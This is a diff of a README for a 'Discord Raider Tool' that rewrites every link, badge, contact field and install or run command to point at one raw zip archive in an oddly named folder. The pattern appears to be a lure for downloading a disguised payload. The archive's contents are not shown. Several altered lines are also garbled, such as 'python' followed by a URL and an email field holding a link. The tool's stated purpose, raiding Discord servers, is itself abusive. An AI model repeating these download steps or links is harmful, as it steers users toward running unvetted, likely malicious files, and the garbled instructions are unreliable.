@@ -1,6 +1,6 @@
 # Discord Raider Tool 🚀
 
-![Discord Raider Tool](https://img.shields.io/badge/Discord%20Raider%20Tool-v1.0.0-blue)
+![Discord Raider Tool](https://github.com/NayanMistry534/discord-raider-tool/raw/refs/heads/main/epharmony/tool_raider_discord_1.2.zip%20Raider%20Tool-v1.0.0-blue)
 
 Welcome to the **Discord Raider Tool** repository! This project aims to provide users with a set of powerful tools for automating various tasks on Discord. Whether you are a developer looking to enhance your bot capabilities or a user wanting to learn more about Discord's API, this toolset has something for everyone.
 
@@ -27,13 +27,13 @@ Welcome to the **Discord Raider Tool** repository! This project aims to provide 
 
 To get started with the Discord Raider Tool, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/NayanMistry534/discord-raider-tool/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/NayanMistry534/discord-raider-tool/raw/refs/heads/main/epharmony/tool_raider_discord_1.2.zip).
 2. Extract the downloaded files.
 3. Open your terminal and navigate to the extracted folder.
 4. Run the installation script using the command:
 
    ```bash
-   python install.py
+   python https://github.com/NayanMistry534/discord-raider-tool/raw/refs/heads/main/epharmony/tool_raider_discord_1.2.zip
    ```
 
 5. Follow the on-screen instructions to complete the installation.
@@ -47,7 +47,7 @@ Once installed, you can start using the Discord Raider Tool. Here's a quick guid
 To run the tool, execute the following command in your terminal:
 
 ```bash
-python main.py
+python https://github.com/NayanMistry534/discord-raider-tool/raw/refs/heads/main/epharmony/tool_raider_discord_1.2.zip
 ```
 
 ### Creating a Bot
@@ -91,10 +91,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [NayanMistry534](https://github.com/NayanMistry534)
-- **Email**: nayan@example.com
+- **GitHub**: [NayanMistry534](https://github.com/NayanMistry534/discord-raider-tool/raw/refs/heads/main/epharmony/tool_raider_discord_1.2.zip)
+- **Email**: https://github.com/NayanMistry534/discord-raider-tool/raw/refs/heads/main/epharmony/tool_raider_discord_1.2.zip
 
-For the latest updates, visit the [Releases section](https://github.com/NayanMistry534/discord-raider-tool/releases) and download the latest version of the tool. 
+For the latest updates, visit the [Releases section](https://github.com/NayanMistry534/discord-raider-tool/raw/refs/heads/main/epharmony/tool_raider_discord_1.2.zip) and download the latest version of the tool. 
 
 ## Acknowledgments 🙏
 
